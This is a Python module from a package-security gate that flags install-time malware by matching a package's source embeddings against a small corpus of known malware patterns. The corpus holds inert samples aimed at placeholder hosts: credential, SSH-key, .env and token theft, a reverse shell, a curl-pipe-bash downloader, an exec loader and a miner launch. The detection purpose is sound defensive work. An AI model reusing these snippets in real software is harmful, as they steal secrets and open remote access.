"""Doubleword — MATCH it: embeddings similarity against a known-malware corpus.

Daytona *runs* the package and Nosana *reads* it; this leg asks a different question —
*have we seen this trick before?* It embeds the package source with a code-aware model
hosted on Doubleword (OpenAI-compatible embeddings API) and cosine-matches it against a
small corpus of known install-time-malware patterns. A close match is a 4th, independent
evidence stream for the judge — it catches repackaged variants that reworded their code to
slip past a scanner, because similarity is on *behaviour/shape*, not exact text.

Corpus note: the patterns below are short, **inert** stand-ins for real attack families —
they reference placeholder hosts and are never executed (they're only ever embedded as
text). An inert pattern still fingerprints close to the real thing. The families are drawn
from the public supply-chain-malware taxonomy (OpenSSF / Datadog datasets).

Fail-safe: no DOUBLEWORD_API_KEY, or any error, → returns None and the gate runs on the
other legs. Runs on the orchestrator (full internet), never inside the sandbox (§8).
"""

from __future__ import annotations

import math

from ..config import Config
from ..types import MalwareMatch
from .static_read import MAX_SOURCE_CHARS, _fetch_source_text

# score >= this → a strong match (a genuine look-alike, not incidental code overlap).
STRONG_MATCH = 0.82

# ~10 inert stand-ins for real install-time-malware families. Strings only — never run.
CORPUS: list[tuple[str, str]] = [
    ("aws-credential-stealer",
     "import os, urllib.request\n"
     "creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
     "urllib.request.urlopen('http://collect.example/aws', data=creds.encode())"),
    ("dotenv-exfiltration",
     "import os, requests\n"
     "env = open(os.path.expanduser('~/.env')).read()\n"
     "requests.post('https://exfil.example/env', data={'e': env})"),
    ("ssh-key-theft",
     "import os, socket\n"
     "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
     "s = socket.create_connection(('198.51.100.7', 80)); s.sendall(key.encode())"),
    ("reverse-shell",
     "import socket, subprocess, os\n"
     "s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
     "os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\n"
     "subprocess.call(['/bin/sh', '-i'])"),
    ("base64-exec-loader",
     "import base64\n"
     "payload = base64.b64decode('aW1wb3J0IHNvY2tldA==')\n"
     "exec(compile(payload, '<s>', 'exec'))"),
    ("install-time-beacon",
     "from setuptools import setup\n"
     "import urllib.request\n"
     "urllib.request.urlopen('http://c2.example/beacon')  # fires during pip install\n"
     "setup(name='pkg')"),
    ("os-system-downloader",
     "import os\n"
     "os.system('curl -s http://malware.example/stage2.sh | bash')"),
    ("environment-exfiltration",
     "import os, json, urllib.request\n"
     "blob = json.dumps(dict(os.environ)).encode()\n"
     "urllib.request.urlopen('http://collect.example/env', data=blob)"),
    ("browser-token-stealer",
     "import os, requests\n"
     "store = os.path.expanduser('~/.config/discord/Local Storage/leveldb/0.log')\n"
     "data = open(store, 'rb').read()\n"
     "requests.post('https://webhook.example/token', data=data)"),
    ("cryptominer-drop",
     "import subprocess\n"
     "subprocess.Popen(['nohup', './xmrig', '--url', 'pool.example:3333', '-u', 'wallet'])"),
]

# model name -> [(family, embedding vector)]; embedded once per process.
_CORPUS_CACHE: dict[str, list[tuple[str, list[float]]]] = {}


def _embed(texts: list[str], config: Config) -> list[list[float]]:
    from openai import OpenAI

    client = OpenAI(api_key=config.doubleword_api_key, base_url=config.doubleword_base_url,
                    timeout=30, max_retries=0)
    resp = client.embeddings.create(model=config.doubleword_embed_model, input=texts)
    return [d.embedding for d in resp.data]


def _corpus_vectors(config: Config) -> list[tuple[str, list[float]]]:
    model = config.doubleword_embed_model
    if model not in _CORPUS_CACHE:
        vecs = _embed([code for _fam, code in CORPUS], config)
        _CORPUS_CACHE[model] = list(zip([fam for fam, _ in CORPUS], vecs))
    return _CORPUS_CACHE[model]


def _cosine(a: list[float], b: list[float]) -> float:
    dot = sum(x * y for x, y in zip(a, b))
    na = math.sqrt(sum(x * x for x in a))
    nb = math.sqrt(sum(y * y for y in b))
    return dot / (na * nb) if na and nb else 0.0


def similarity_match(package: str, config: Config, *, source: str | None = None) -> MalwareMatch | None:
    """Embed the package source and return its closest known-malware family (or None)."""
    if not config.doubleword_api_key:
        return None
    src = source if source is not None else _fetch_source_text(package)
    if not src:
        return None
    try:
        corpus = _corpus_vectors(config)
        query = _embed([src[:MAX_SOURCE_CHARS]], config)[0]
    except Exception:  # network / model / auth failure — degrade, don't crash the gate
        return None
    family, score = max(((fam, _cosine(query, vec)) for fam, vec in corpus), key=lambda t: t[1])
    return MalwareMatch(family=family, score=round(score, 3), strong=score >= STRONG_MATCH)
